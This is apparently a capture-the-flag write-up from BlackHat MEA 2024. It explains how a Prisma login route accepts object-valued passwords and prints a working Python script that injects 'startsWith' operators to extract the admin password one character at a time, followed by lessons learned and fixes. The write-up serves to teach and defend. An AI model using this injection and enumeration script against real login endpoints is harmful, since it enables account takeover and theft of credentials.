---
title: "BlackHat MEA 2024 - Secure Portal Writeup"
date: "2024-11-28"
description: "Analyzing a critical vulnerability in Prisma ORM authentication, its exploitation using query operators, and best practices to secure web applications."
tags: ["web-security", "prisma", "injection", "hacking", "authentication"]
---

## Exploiting ORM Misuse: A Deep Dive into Prisma Injection

**Category**: Web  
**Points**: 100  
**Description**: No one can get into my secure portal

## Initial Analysis

When I first looked at the challenge, I noticed it was a web application with login functionality. The interesting part was that it used Prisma as its ORM (Object-Relational Mapping).

## Vulnerability Discovery

Looking at the source code, I found a critical vulnerability in the login route:

```javascript
const user = await prisma.user.findUnique({
  where: { email, password },
});
```

The vulnerability exists because:
1. The password field accepts object-based queries
2. The admin's password contains the flag (set from `process.env.FLAG`)
3. There's no proper password hashing
4. The login route misuses Prisma's `findUnique`

## Exploitation

I realized I could exploit this by using Prisma's query operators. Instead of sending a plain password string, I could send an object with operators like `startsWith` or `contains`. This allowed me to enumerate the flag character by character.

Here's the exploit script I developed:

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor

# Target URL
base_url = "http://a4c03f28d03ded48250f8.playat.flagyard.com"

def verify_partial_flag(test_flag):
    login_url = f"{base_url}/login"
    payload = {
        "email": "admin@admin.com",
        "password": {"startsWith": test_flag}
    }
    
    try:
        response = requests.post(login_url, json=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Error: {str(e)}")
        return False

def try_flag_chars():
    known_start = "BHFlagY{"
    chars = string.ascii_lowercase + string.digits + "}"
    
    print(f"Starting with known part: {known_start}")
    
    current_flag = known_start
    max_length = 50
    position = len(current_flag)
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        while position < max_length and "}" not in current_flag:
            found_char = False
            test_flags = [(current_flag + char) for char in chars]
            results = list(executor.map(verify_partial_flag, test_flags))
            
            for char, is_valid in zip(chars, results):
                if is_valid:
                    current_flag += char
                    position += 1
                    print(f"\nConfirmed partial flag: {current_flag}")
                    found_char = True
                    break
            
            if not found_char:
                print(f"\nCouldn't find next character after: {current_flag}")
                break
    
    return current_flag

if __name__ == "__main__":
    print("Starting flag enumeration...")
    flag = try_flag_chars()
```

The script works by:
1. Starting with the known flag format `BHFlagY{`
2. Testing each possible next character using Prisma's `startsWith` operator
3. When a character is confirmed, it's added to the known part of the flag
4. The process continues until the closing brace is found

## Running the Exploit

When I ran the script, it successfully extracted the flag character by character:

```python
Starting flag enumeration...
Starting with known part: BHFlagY{
Confirmed partial flag: BHFlagY{b
Confirmed partial flag: BHFlagY{bb
Confirmed partial flag: BHFlagY{bba...
```

The script continued until it found the complete flag.

## Key Learnings

This challenge taught me several important lessons:
1. Always validate input types strictly
2. Don't use ORMs in ways they weren't designed for
3. Never store sensitive data (like flags) in password fields
4. Always implement proper password hashing
5. Be careful with database query operators in authentication logic

## Prevention

To prevent this vulnerability, the application should:
1. Use password hashing instead of storing plaintext passwords
2. Validate input types strictly (only accept strings for passwords)
3. Compare passwords after retrieving the user, not in the database query
4. Not store sensitive data in password fields
5. Use Prisma's `findUnique` correctly with only exact matches

## Conclusion

This was an interesting challenge that highlighted how misusing an ORM can lead to serious security vulnerabilities. The ability to inject query operators into what should be a simple string field allowed for complete enumeration of the admin's password, which contained the flag.

The flag format was: `BHFlagY{...}`.